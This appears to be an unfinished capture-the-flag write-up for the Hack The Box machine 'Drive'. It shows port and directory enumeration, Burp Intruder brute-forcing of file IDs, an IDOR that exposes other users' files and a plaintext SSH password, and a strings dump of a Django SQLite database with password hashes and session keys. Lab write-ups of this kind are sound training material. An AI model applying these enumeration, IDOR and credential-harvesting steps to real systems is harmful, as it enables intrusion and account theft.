# Drive

## Pending 2 be rewritten

#activemachine 
#hard
#hashcrack 
#databsedump
#web 
#git
#decompile 
#sqlite3
#cpp
#sqlinjection 


`nmap -sV -v  $TARGET`

```
Nmap scan report for 10.10.11.235
Host is up (0.052s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



`http://drive.htb/`

`echo "${TARGET} drive.htb" | sudo tee -a /etc/hosts`

`whatweb drive.htb`

```
http://drive.htb [200 OK] Bootstrap, Cookies[csrftoken], Country[RESERVED][ZZ], Django, Email[customer-support@drive.htb,support@drive.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.235], JQuery[3.0.0], Script, Title[Doodle Grive], UncommonHeaders[x-content-type-options,referrer-policy,cross-origin-opener-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], nginx[1.18.0]
```
register and login

we also perform a enum

`dirsearch -u http://drive.htb/`

```
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/drive.htb/-_23-12-06_10-47-44.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-12-06_10-47-44.log

Target: http://drive.htb/

[10:47:44] Starting: 
[10:47:46] 302 -    0B  - /.git/hooks/update  ->  /login/
[10:47:56] 302 -    0B  - /bitrix/modules/updater.log  ->  /login/
[10:47:56] 302 -    0B  - /bitrix/modules/updater_partner.log  ->  /login/
[10:47:58] 302 -    0B  - /confluence/plugins/servlet/oauth/update-consumer-info  ->  /login/
[10:47:58] 301 -    0B  - /contact  ->  /contact/
[10:48:00] 200 -    2KB - /favicon.ico
[10:48:02] 301 -    0B  - /home  ->  /home/
[10:48:03] 302 -    0B  - /install/update.log  ->  /login/
[10:48:04] 301 -    0B  - /login  ->  /login/
[10:48:04] 200 -    2KB - /login/
[10:48:04] 302 -    0B  - /logout/  ->  /
[10:48:04] 301 -    0B  - /logout  ->  /logout/
[10:48:09] 301 -    0B  - /register  ->  /register/
[10:48:09] 301 -    0B  - /reports  ->  /reports/
[10:48:11] 301 -    0B  - /subscribe  ->  /subscribe/
[10:48:13] 302 -    0B  - /upload.asp  ->  /login/
[10:48:13] 301 -    0B  - /upload  ->  /upload/
[10:48:13] 302 -    0B  - /upload.cfm  ->  /login/
[10:48:13] 302 -    0B  - /upload.php  ->  /login/
[10:48:13] 302 -    0B  - /upload.aspx  ->  /login/
[10:48:13] 302 -    0B  - /upload.php3  ->  /login/
[10:48:13] 302 -    0B  - /upload/b_user.csv  ->  /login/
[10:48:13] 302 -    0B  - /upload/1.php  ->  /login/
[10:48:13] 302 -    0B  - /upload/  ->  /login/
[10:48:13] 302 -    0B  - /upload/2.php  ->  /login/
[10:48:13] 302 -    0B  - /upload.htm  ->  /login/
[10:48:13] 302 -    0B  - /upload.html  ->  /login/
[10:48:13] 302 -    0B  - /upload.shtm  ->  /login/
[10:48:13] 302 -    0B  - /upload/b_user.xls  ->  /login/
[10:48:13] 302 -    0B  - /upload/test.txt  ->  /login/
[10:48:13] 302 -    0B  - /upload/loginIxje.php  ->  /login/
[10:48:13] 302 -    0B  - /upload/test.php  ->  /login/
[10:48:13] 302 -    0B  - /upload/upload.php  ->  /login/
[10:48:13] 302 -    0B  - /upload_admin  ->  /login/
[10:48:13] 302 -    0B  - /upload2.php  ->  /login/
[10:48:13] 302 -    0B  - /upload_backup/  ->  /login/
[10:48:13] 302 -    0B  - /upload_file.php  ->  /login/
[10:48:13] 302 -    0B  - /uploaded/  ->  /login/
[10:48:13] 302 -    0B  - /uploader.php  ->  /login/
[10:48:13] 302 -    0B  - /uploader/  ->  /login/
[10:48:13] 302 -    0B  - /uploadfile.asp  ->  /login/
[10:48:13] 302 -    0B  - /uploader  ->  /login/
[10:48:13] 302 -    0B  - /uploadfile.php  ->  /login/
[10:48:13] 302 -    0B  - /uploadify  ->  /login/
[10:48:13] 302 -    0B  - /uploadify.php  ->  /login/
[10:48:13] 302 -    0B  - /uploadfiles.php  ->  /login/
[10:48:13] 302 -    0B  - /uploads  ->  /login/
[10:48:13] 302 -    0B  - /uploads.php  ->  /login/
[10:48:13] 302 -    0B  - /uploads/  ->  /login/
[10:48:13] 302 -    0B  - /uploads_admin  ->  /login/
[10:48:13] 302 -    0B  - /uploads/dump.sql  ->  /login/
[10:48:13] 302 -    0B  - /uploadify/  ->  /login/
[10:48:13] 302 -    0B  - /uploads/affwp-debug.log  ->  /login/

Task Completed

```

`dirsearch -u http://drive.htb/ --cookie "sessionid=w84ie5pczk1t4b5qqvvc0g9e1kdu8wtn;csrftoken=hp12CfzwbOmW0kx51FuMewSMQ2DOaPZI"`
```

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/drive.htb/-_23-12-06_10-50-08.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-12-06_10-50-08.log

Target: http://drive.htb/

[10:50:08] Starting: 
[10:50:38] 301 -    0B  - /contact  ->  /contact/
[10:50:44] 200 -    2KB - /favicon.ico
[10:50:46] 301 -    0B  - /home  ->  /home/
[10:50:51] 301 -    0B  - /login  ->  /login/
[10:50:51] 200 -    2KB - /login/
[10:50:52] 301 -    0B  - /logout  ->  /logout/
[10:50:52] 302 -    0B  - /logout/  ->  /
[10:51:00] 301 -    0B  - /register  ->  /register/
[10:51:00] 301 -    0B  - /reports  ->  /reports/
[10:51:05] 301 -    0B  - /subscribe  ->  /subscribe/
[10:51:07] 302 -    0B  - /upload_admin  ->  /login/
[10:51:07] 302 -    0B  - /upload_backup/  ->  /login/
[10:51:07] 302 -    0B  - /upload_file.php  ->  /login/
[10:51:07] 302 -    0B  - /upload/upload.php  ->  /login/
[10:51:07] 302 -    0B  - /uploader.php  ->  /login/
[10:51:07] 302 -    0B  - /upload/1.php  ->  /login/
[10:51:07] 302 -    0B  - /uploader  ->  /login/
[10:51:07] 302 -    0B  - /upload/b_user.xls  ->  /login/
[10:51:07] 302 -    0B  - /upload.htm  ->  /login/
[10:51:07] 302 -    0B  - /upload.html  ->  /login/
[10:51:07] 302 -    0B  - /uploaded/  ->  /login/
[10:51:07] 302 -    0B  - /upload.cfm  ->  /login/
[10:51:07] 302 -    0B  - /upload.shtm  ->  /login/
[10:51:07] 302 -    0B  - /upload.php  ->  /login/
[10:51:07] 302 -    0B  - /upload/b_user.csv  ->  /login/
[10:51:07] 302 -    0B  - /upload/  ->  /login/
[10:51:07] 302 -    0B  - /uploadfile.asp  ->  /login/
[10:51:07] 302 -    0B  - /upload/test.php  ->  /login/
[10:51:07] 302 -    0B  - /upload.php3  ->  /login/
[10:51:07] 302 -    0B  - /upload/2.php  ->  /login/
[10:51:07] 302 -    0B  - /upload.aspx  ->  /login/
[10:51:07] 302 -    0B  - /upload.asp  ->  /login/
[10:51:07] 302 -    0B  - /upload/loginIxje.php  ->  /login/
[10:51:07] 301 -    0B  - /upload  ->  /upload/
[10:51:07] 302 -    0B  - /upload/test.txt  ->  /login/
[10:51:07] 302 -    0B  - /upload2.php  ->  /login/
[10:51:07] 302 -    0B  - /uploader/  ->  /login/
[10:51:07] 302 -    0B  - /uploads/affwp-debug.log  ->  /login/
[10:51:07] 302 -    0B  - /uploadfiles.php  ->  /login/
[10:51:07] 302 -    0B  - /uploadify  ->  /login/
[10:51:07] 302 -    0B  - /uploadify.php  ->  /login/
[10:51:07] 302 -    0B  - /uploadfile.php  ->  /login/
[10:51:07] 302 -    0B  - /uploadify/  ->  /login/
[10:51:07] 302 -    0B  - /uploads  ->  /login/
[10:51:07] 302 -    0B  - /uploads.php  ->  /login/
[10:51:07] 302 -    0B  - /uploads/  ->  /login/
[10:51:07] 302 -    0B  - /uploads/dump.sql  ->  /login/
[10:51:07] 302 -    0B  - /uploads_admin  ->  /login/


```

if we upload a file (reverse shell PHP) and we check its contents in the web we see `http://drive.htb/115/getFileDetail/`

we send the request to see he file to burpsuite then with the intruder(CTRL + I) we select sniper and add the \$\$ into the number parameter to perform a brute force from 0 to 200 to check if we can access any other doc

the only 2 focs we are allowed to see are our doc and the welcome one

but there a few which exist but we dont have access

`79,98,99,101,113,114`

in the dashboard we can see also our file as it is in the public gorup and we can block it `http://drive.htb/115/block/`
here we use the others files ids

bingo this allow us to see others users files

`http://drive.htb/79/block/`

-->
`**announce_to_the_software_Engineering_team**`
```
hey team after the great success of the platform we need now to continue the work.  
on the new features for ours platform.  
I have created a user for martin on the server to make the workflow easier for you please use the password "Xk4@KjyrYv8t194L!".  
please make the necessary changes to the code before the end of the month  
I will reach you soon with the token to apply your changes on the repo  
thanks!
```
`http://drive.htb/101/block/`
`**database_backup_plan!**`
```
hi team!  
me and my friend(Cris) created a new scheduled backup plan for the database  
the database will be automatically highly compressed and copied to /var/www/backups/ by a small bash script every day at 12:00 AM  
*Note: the backup directory may change in the future!  
*Note2: the backup would be protected with strong password! don't even think to crack it guys! :)
```


now we have credentials to use SSH

we have a user but it doesnt have the user flag
and it also doesnt have any special binaries or privileges


`cd /var/www/backups/`

```
1_Dec_db_backup.sqlite3.7z  1_Oct_db_backup.sqlite3.7z  db.sqlite3
1_Nov_db_backup.sqlite3.7z  1_Sep_db_backup.sqlite3.7z
```

`strings db.sqlite3`

```
strings db.sqlite3 
SQLite format 3
WAmyApp0003_alter_file_block_alter_file_name2022-11-29 17:58:56.5823828
/Aaccounts0002_alter_g_name2022-11-29 17:58:56.2675613
+AmyApp0002_file_block2022-11-29 12:40:55.4116723
%Asessions0001_initial2022-11-23 19:08:48.7230140
%AmyApp0001_initial2022-11-23 19:08:48.412511I
WAadmin0003_logentry_add_action_flag_choices2022-11-23 19:08:48.024447A
GAadmin0002_logentry_remove_auto_add2022-11-23 19:08:47.7899750
%Aadmin0001_initial2022-11-23 19:08:47.6578193
%Aaccounts0001_initial2022-11-23 19:08:47.335674H
WAauth0012_alter_user_first_name_max_length2022-11-23 19:08:47.013571@
GAauth0011_update_proxy_permissions2022-11-23 19:08:46.894285C
MAauth0010_alter_group_name_max_length2022-11-23 19:08:46.748619G
UAauth0009_alter_user_last_name_max_length2022-11-23 19:08:46.627482F
SAauth0008_alter_user_username_max_length2022-11-23 19:08:46.517074K	
]Aauth0007_alter_validators_add_error_messages2022-11-23 19:08:46.347509A
IAauth0006_require_contenttypes_00022022-11-23 19:08:46.226926B
KAauth0005_alter_user_last_login_null2022-11-23 19:08:46.016827@
GAauth0004_alter_user_username_opts2022-11-23 19:08:45.897147C
MAauth0003_alter_user_email_max_length2022-11-23 19:08:45.784840H
WAauth0002_alter_permission_name_max_length2022-11-23 19:08:45.643275/
%Aauth0001_initial2022-11-23 19:08:45.520436H
%GAcontenttypes0002_remove_content_type_name2022-11-23 19:08:45.1797847
%%Acontenttypes0001_initial2022-11-23 19:08:45.036625
myApp_file_groups
accounts_customuser
django_admin_log
accounts_g_users
myApp_filee
auth_permission 
accounts_g+
auth_group
django_migrations
django_content_type
myAppfile
accountsg
accountscustomuser
sessionssession
contenttypescontenttype
authgroup
authpermission
	adminlogentry
myAppfile
accountsg
!accountscustomuser
sessionssession
%#contenttypescontenttype
authgroup
!authpermission
adminlogentry
view_file 
delete_file
change_file
add_file
view_g
delete_g
change_g
add_g
view_customuser
delete_customuser
change_customuser
add_customuser
view_session
delete_session
change_session
add_session
view_contenttype
delete_contenttype
change_contenttype
add_contenttype
view_group
delete_group
change_group
add_group	
view_permission
delete_permission
change_permission
add_permission
view_logentry
delete_logentry
change_logentry
	%	add_logentry
	3sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e30042022-12-24 13:17:45tomHandstom@drive.htb2022-12-23 12:37:45
	3sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f2022-12-24 12:55:10martinCruzmartin@drive.htb2022-12-23 12:35:02
	3sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f2022-12-24 16:51:53crisDiselcris@drive.htb2022-12-23 12:39:15
	3sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a2022-12-26 05:48:27.497873jamesMasonjamesMason@drive.htb2022-12-23 12:33:04
+		Asha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a32022-12-26 05:43:40.388717adminadmin@drive.htb2022-12-26 05:30:58.003372
crisDisel
tomHands
martinCruz
jamesMason
admin
view_fileCan view file 
delete_fileCan delete file 
change_fileCan change file
add_fileCan add file
view_gCan view g
delete_gCan delete g
change_gCan change g
add_gCan add g"
view_customuserCan view user&
delete_customuserCan delete user&
change_customuserCan change user 
add_customuserCan add user"
view_sessionCan view session&
delete_sessionCan delete session&
change_sessionCan change session 
add_sessionCan add session+
view_contenttypeCan view content type/
delete_contenttypeCan delete content type/
change_contenttypeCan change content type)
add_contenttypeCan add content type
view_groupCan view group"
delete_groupCan delete group"
change_groupCan change group
add_groupCan add group(
view_permissionCan view permission,
delete_permissionCan delete permission,
change_permissionCan change permission&
add_permissionCan add permission$
	'1view_logentryCan view log entry(
	+5delete_logentryCan delete log entry(
	+5change_logentryCan change log entry"
	%/add_logentryCan add log entry
Etableaccounts_customuser_groupsaccounts_customuser_groups
CREATE TABLE "accounts_customuser_groups" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "customuser_id" bigint NOT NULL REFERENCES "accounts_customuser" ("id") DEFERRABLE INITIALLY DEFERRED, "group_id" integer NOT NULL REFERENCES "auth_group" ("id") DEFERRABLE INITIALLY DEFERRED)E
indexsqlite_autoindex_accounts_customuser_1accounts_customuser
7tableaccounts_customuseraccounts_customuser
CREATE TABLE "accounts_customuser" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "password" varchar(128) NOT NULL, "last_login" datetime NULL, "is_superuser" bool NOT NULL, "username" varchar(150) NOT NULL UNIQUE, "first_name" varchar(150) NOT NULL, "last_name" varchar(150) NOT NULL, "email" varchar(254) NOT NULL, "is_staff" bool NOT NULL, "is_active" bool NOT NULL, "date_joined" datetime NOT NULL)3
indexsqlite_autoindex_auth_group_1auth_group
mtableauth_groupauth_group
CREATE TABLE "auth_group" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(150) NOT NULL UNIQUE)
Mindexauth_permission_content_type_id_2f476e4bauth_permission
CREATE INDEX "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id")
indexauth_permission_content_type_id_codename_01ab375a_uniqauth_permission
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename")
tableauth_permissionauth_permission
CREATE TABLE "auth_permission" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "content_type_id" integer NOT NULL REFERENCES "django_content_type" ("id") DEFERRABLE INITIALLY DEFERRED, "codename" varchar(100) NOT NULL, "name" varchar(255) NOT NULL)
aindexauth_group_permissions_permission_id_84c5c92eauth_group_permissions
CREATE INDEX "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id")
Mindexauth_group_permissions_group_id_b120cbf9auth_group_permissions
CREATE INDEX "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id")
#indexauth_group_permissions_group_id_permission_id_0cd325b0_uniqauth_group_permissions
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id")
7tableauth_group_permissionsauth_group_permissions	CREATE TABLE "auth_group_permissions" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "group_id" integer NOT NULL REFERENCES "auth_group" ("id") DEFERRABLE INITIALLY DEFERRED, "permission_id" integer NOT NULL REFERENCES "auth_permission" ("id") DEFERRABLE INITIALLY DEFERRED)
{indexdjango_content_type_app_label_model_76bd3d3b_uniqdjango_content_type
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model")
9tabledjango_content_typedjango_content_type
CREATE TABLE "django_content_type" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "app_label" varchar(100) NOT NULL, "model" varchar(100) NOT NULL)P
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
atabledjango_migrationsdjango_migrations
CREATE TABLE "django_migrations" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "app" varchar(255) NOT NULL, "name" varchar(255) NOT NULL, "applied" datetime NOT NULL)
{indexaccounts_g_users_g_id_customuser_id_30f9888c_uniqaccounts_g_users
CREATE UNIQUE INDEX "accounts_g_users_g_id_customuser_id_30f9888c_uniq" ON "accounts_g_users" ("g_id", "customuser_id")	
indexaccounts_customuser_user_permissions_permission_id_aea3d0e5accounts_customuser_user_permissions
CREATE INDEX "accounts_customuser_user_permissions_permission_id_aea3d0e5" ON "accounts_customuser_user_permissions" ("permission_id")
indexaccounts_customuser_user_permissions_customuser_id_0deaefaeaccounts_customuser_user_permissions
CREATE INDEX "accounts_customuser_user_permissions_customuser_id_0deaefae" ON "accounts_customuser_user_permissions" ("customuser_id")
oindexaccounts_customuser_user_permissions_customuser_id_permission_id_9632a709_uniqaccounts_customuser_user_permissions
CREATE UNIQUE INDEX "accounts_customuser_user_permissions_customuser_id_permission_id_9632a709_uniq" ON "accounts_customuser_user_permissions" ("customuser_id", "permission_id")
]indexaccounts_customuser_groups_group_id_86ba5f9eaccounts_customuser_groups
CREATE INDEX "accounts_customuser_groups_group_id_86ba5f9e" ON "accounts_customuser_groups" ("group_id")
qindexaccounts_customuser_groups_customuser_id_bc55088eaccounts_customuser_groups
CREATE INDEX "accounts_customuser_groups_customuser_id_bc55088e" ON "accounts_customuser_groups" ("customuser_id")
3indexaccounts_customuser_groups_customuser_id_group_id_c074bdcb_uniqaccounts_customuser_groups
CREATE UNIQUE INDEX "accounts_customuser_groups_customuser_id_group_id_c074bdcb_uniq" ON "accounts_customuser_groups" ("customuser_id", "group_id")
'tableaccounts_g_usersaccounts_g_users
CREATE TABLE "accounts_g_users" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "g_id" bigint NOT NULL REFERENCES "accounts_g" ("id") DEFERRABLE INITIALLY DEFERRED, "customuser_id" bigint NOT NULL REFERENCES "accounts_customuser" ("id") DEFERRABLE INITIALLY DEFERRED)
mtableaccounts_customuser_user_permissionsaccounts_customuser_user_permissions
CREATE TABLE "accounts_customuser_user_permissions" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "customuser_id" bigint NOT NULL REFERENCES "accounts_customuser" ("id") DEFERRABLE INITIALLY DEFERRED, "permission_id" integer NOT NULL REFERENCES "auth_permission" ("id") DEFERRABLE INITIALLY DEFERRED)
7documents/jamesMason/database_backup_planhi team!
me and my friend(Cris) created a new backup scheduled plan for the database
the database will be automatically highly compressed and copied to /var/www/backups/ by a small bash script every day at 12:00 AM
*Note: the backup directory may change in the future!
*Note2: the backup would be protected with strong password! don't even think to crack it guys! :)2022-12-24 22:49:49.515472
database_backup_plan!
/documents/jamesMason/security_announceb'hi team\nplease we have to stop using the document platform for the chat\n+I have fixed the security issues in the middleware\nthanks! :)\n'2022-12-24 16:55:56.501240
security_announce
documents/crisDisel/Hib'hi team\nhave a great day.\nwe are testing the new edit functionality!\nit seems to work great!\n'2022-12-24 16:52:22.971837
2022-12-26 05:32:39.75850916admin
2022-12-26 05:31:36.78078816admin[{"changed": {"fields": ["Password"]}}]
2022-12-26 05:51:24.25817125dada
2022-12-26 05:51:24.19799626dada2
2022-12-26 05:51:24.13513327dada3
2022-12-26 05:51:24.07307628dad2
2022-12-26 05:51:24.01251029dad4
2022-12-26 05:51:12.06563724crisDisel[{"changed": {"fields": ["Password"]}}]
2022-12-26 05:50:31.09830523tomHands[{"changed": {"fields": ["Password"]}}]
2022-12-26 05:49:04.84795622martinCruz[{"changed": {"fields": ["Password"]}}]
2022-12-26 05:48:06.56870321jamesMason[{"changed": {"fields": ["Password"]}}]
2022-12-26 05:37:56.55971421jamesMason[{"changed": {"fields": ["Password"]}}]
tablemyApp_filemyApp_file
CREATE TABLE "myApp_file" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "file" varchar(100) NOT NULL, "content" text NOT NULL, "createdDate" datetime NOT NULL, "owner_id" bigint NOT NULL REFERENCES "accounts_customuser" ("id") DEFERRABLE INITIALLY DEFERRED, "block_id" bigint NULL REFERENCES "accounts_customuser" ("id") DEFERRABLE INITIALLY DEFERRED, "name" varchar(50) NOT NULL UNIQUE)
indexsqlite_autoindex_myApp_file_1myApp_file2
)tableaccounts_gaccounts_g0CREATE TABLE "accounts_g" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "owner_id" bigint NULL REFERENCES "accounts_customuser" ("id") DEFERRABLE INITIALLY DEFERRED, "name" varchar(255) NOT NULL UNIQUE)
indexmyApp_file_block_id_b1f1efd0myApp_file&CREATE INDEX "myApp_file_block_id_b1f1efd0" ON "myApp_file" ("block_id"){A
indexmyApp_file_owner_id_4cd886eamyApp_file$CREATE INDEX "myApp_file_owner_id_4cd886ea" ON "myApp_file" ("owner_id")
9indexdjango_session_expire_date_a5c62663django_session-CREATE INDEX "django_session_expire_date_a5c62663" ON "django_session" ("expire_date")
'tabledjango_sessiondjango_session+CREATE TABLE "django_session" ("session_key" varchar(40) NOT NULL PRIMARY KEY, "session_data" text NOT NULL, "expire_date" datetime NOT NULL);7
indexsqlite_autoindex_django_session_1django_session,
)indexmyApp_file_groups_g_id_640e4810myApp_file_groups*CREATE INDEX "myApp_file_groups_g_id_640e4810" ON "myApp_file_groups" ("g_id")
5indexmyApp_file_groups_file_id_10485c86myApp_file_groups)CREATE INDEX "myApp_file_groups_file_id_10485c86" ON "myApp_file_groups" ("file_id")
gindexmyApp_file_groups_file_id_g_id_fc3f9147_uniqmyApp_file_groups'CREATE UNIQUE INDEX "myApp_file_groups_file_id_g_id_fc3f9147_uniq" ON "myApp_file_groups" ("file_id", "g_id")
tablemyApp_file_groupsmyApp_file_groups%CREATE TABLE "myApp_file_groups" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "file_id" bigint NOT NULL REFERENCES "myApp_file" ("id") DEFERRABLE INITIALLY DEFERRED, "g_id" bigint NOT NULL REFERENCES "accounts_g" ("id") DEFERRABLE INITIALLY DEFERRED)
indexaccounts_g_owner_id_f5ef7798accounts_g
CREATE INDEX "accounts_g_owner_id_f5ef7798" ON "accounts_g" ("owner_id")3=
indexsqlite_autoindex_accounts_g_1accounts_g1
1indexdjango_admin_log_user_id_c564eba6django_admin_log"CREATE INDEX "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id")
Qindexdjango_admin_log_content_type_id_c4bce8ebdjango_admin_log!CREATE INDEX "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id")
Atabledjango_admin_logdjango_admin_log#CREATE TABLE "django_admin_log" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "action_time" datetime NOT NULL, "object_id" text NULL, "object_repr" varchar(200) NOT NULL, "change_message" text NOT NULL, "content_type_id" integer NULL REFERENCES "django_content_type" ("id") DEFERRABLE INITIALLY DEFERRED, "user_id" bigint NOT NULL REFERENCES "accounts_customuser" ("id") DEFERRABLE INITIALLY DEFERRED, "action_flag" smallint unsigned NOT NULL CHECK ("action_flag" >= 0))
Iindexaccounts_g_users_customuser_id_8a4963c5accounts_g_users CREATE INDEX "accounts_g_users_customuser_id_8a4963c5" ON "accounts_g_users" ("customuser_id")
%indexaccounts_g_users_g_id_60e09ebfaccounts_g_users
CREATE INDEX "accounts_g_users_g_id_60e09ebf" ON "accounts_g_users" ("g_id")
wpu7jg9hlqcynbjvq3gfclfusqetrbua#$
3kmo09a5cvs04hkc1chk4np7vhvst5s9$$
9zas0dulo9fn4a0ypqx48svhjbz0rpyu!$
bbfm455c2iauj17wcn7fa68x8f400omt $
lb7q9n1dkpm5robf4epc0s37g77gepxz
c9rp1oczujzqvhbpd7xthmdvsgtm5ry0
1ljtu0pvn8es3irnya1rq3nhuq4h5wpz%$
ktwuu1v0bmppcu3waiirbxwd0fri839v
4douqtfjkb6t7lmtdo002isg16sps2hn
yfak82pqlnx2a96vqejsqg8iuxz8qeod
ijuok0t9s6g2nbvopmeg7drpzxowhv5h
upxd55esn27astq83891c9ottrsqbd9p
1c8lienktkpp3yrnf2w88wwng73zrbw2
v2tgs7mht97tyzklhd5at32nqo0ut5xs
2j0ezn06o125zznztatw9hbg4zrdwpmv
cgf9i1hxjxaaq1g7foaeeauvbr95gol6
kc4wmpdgu25njmvkcnulqlm0zsplmw6k
ani56crl1afjyqtylcqb8vdx28hk8ns9
2resq7f37l6kbtf30tl1731a67t8cvq4
b59zc1mibwd3usk4s1ommxqz1ra139lh
obcde8c0pyct0fdhy4p8xwssvirxstv9	$
flv9hsyegq6o5ykfp6vcjo3hjad567ur
yk0py1s84wl8relmjis71nwomh83bxjc
zzkr85cbpgqzjo51kafycrgvftn9jg8x
yi9se9j04wj6aafubclxy1v4i3j0hnnh
z6wfj39g7y4ro1cs6cy9wl3zwtcz92ch
M	s9c3i4ytmwu4ulrvsi1ndgh8pu6iyk0u
2023-01-07 22:39:43.009097#
2023-01-09 05:43:40.715808$
2023-01-07 16:53:07.832119!
2023-01-07 13:17:45.515456 
2023-01-07 12:55:10.529873
2023-01-06 12:39:42.956192
2023-01-09 05:48:28.772152%
2022-12-24 17:09:08.326144
2022-12-24 14:58:37.446315
2022-12-24 08:44:54.848557
2022-12-23 22:42:28.760159
2022-12-21 20:03:41.075162
2022-12-21 18:46:48.158129
2022-12-21 17:56:02.999373
2022-12-20 19:43:26.890086
2022-12-20 09:05:20.721154
2022-12-24 13:23:39.937115
2022-12-20 08:52:00.668726
2022-12-19 16:02:42.841314
2022-12-20 08:51:48.628302
2022-12-18 15:59:27.051845	
2022-12-18 10:27:11.176143
2022-12-18 18:24:11.781905
2022-12-16 18:37:23.308384
2022-12-16 18:33:11.965831
2022-12-16 22:57:43.322348
A	2022-12-14 11:44:07.495898
SA1c8lienktkpp3yrnf2w88wwng73zrbw2.eJxVjMsOwiAQRf-FtSFlOozUpft-A-ExSNVAUtqV8d-VpAvdnnPufQnr9i3bvfFqlyguQonTL_MuPLh0Ee-u3KoMtWzr4mVP5GGbnGvk5_Vo_w6ya_m7JuQ0oHEDRSQ-j0p7JkI9upBSADCUULGaGDR5ABVMgggwaupoQvH-ANMuNxo:1p2zRQ:SH-kOMMrWrJbp9uRd6Eg1skNdfSfanWC3bir4cprfaM2022-12-21 18:46:48.158129
SAv2tgs7mht97tyzklhd5at32nqo0ut5xs.eJxVjMsOwiAQRf-FtSFlOozUpft-A-ExSNVAUtqV8d-VpAvdnnPufQnr9i3bvfFqlyguQonTL_MuPLh0Ee-u3KoMtWzr4mVP5GGbnGvk5_Vo_w6ya_m7JuQ0oHEDRSQ-j0p7JkI9upBSADCUULGaGDR5ABVMgggwaupoQvH-ANMuNxo:1p2yeI:MfqljWPAZOglsfjwfpaqCIZKUtBe23QdO2e9h--HfXA2022-12-21 17:56:02.999373
SA2j0ezn06o125zznztatw9hbg4zrdwpmv.eJxVjMsOwiAQRf-FtSFlOozUpft-A-ExSNVAUtqV8d-VpAvdnnPufQnr9i3bvfFqlyguQonTL_MuPLh0Ee-u3KoMtWzr4mVP5GGbnGvk5_Vo_w6ya_m7JuQ0oHEDRSQ-j0p7JkI9upBSADCUULGaGDR5ABVMgggwaupoQvH-ANMuNxo:1p2dqg:kB-KH4AlCg_snCokGdJiDlF8e2_ObnRirxOddaphtak2022-12-20 19:43:26.890086
UAcgf9i1hxjxaaq1g7foaeeauvbr95gol6.eJxVjDEOwjAMRe-SGUVumjgRIztniOzGJgXUSk07Ie4OlTrA-t97_2UybWvNW5Mlj8WcTTSn341peMi0g3Kn6TbbYZ7WZWS7K_agzV7nIs_L4f4dVGr1W3tkJY6QRNWnwB5BQ6cOxQv2Q5cYSCW6PmIXAUPx4FOB1CsKgQvm_QHqdTd4:1p2TtA:7YKuEZI7lbWSw85mDuYiZiHfvnhxmZ8-sn8dZky8-J02022-12-20 09:05:20.721154t
MyAani56crl1afjyqtylcqb8vdx28hk8ns9e30:1p2TgG:vM9gGRexNNb7m5BVfkHfh7wFZpmS47AFGFbChYVP4kQ2022-12-20 08:52:00.668726t
MyAb59zc1mibwd3usk4s1ommxqz1ra139lhe30:1p2Tg4:d0gtnJR9obTuZsWm-oEjUQ-4CIM08Y6T5euoP1vpe0U2022-12-20 08:51:48.628302t
MyA2resq7f37l6kbtf30tl1731a67t8cvq4e30:1p2DvW:_33sMQAF6YYaRlY3MbZzFsrV6uvGGWvi1SQxyJoETbA2022-12-19 16:02:42.841314
